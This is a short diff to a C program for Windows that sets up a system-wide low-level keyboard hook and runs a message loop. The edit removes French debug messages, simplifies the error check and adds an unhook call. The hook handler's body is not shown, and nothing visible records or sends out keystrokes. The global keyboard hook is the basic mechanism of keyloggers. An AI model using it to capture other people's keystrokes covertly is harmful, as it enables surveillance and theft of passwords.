@@ -12,23 +12,20 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 void	setwinhook()
 {
 	hinst = GetModuleHandle(NULL);
-	handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);
-	if (handlekeyboard == NULL)
-		printf("c'est nul\n");
-	else
-		printf("c'est pas nul\n");
-	printf("coucou\n");
+	if ((handlekeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0)) == NULL)
+		return;
 }
 
 int	main(void)
 {
 	MSG msg;
 
-	setwinhook();
+	setwinhook();				
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
+	UnhookWindowsHookEx(handlekeyboard);
 	return (msg.wParam);
 }
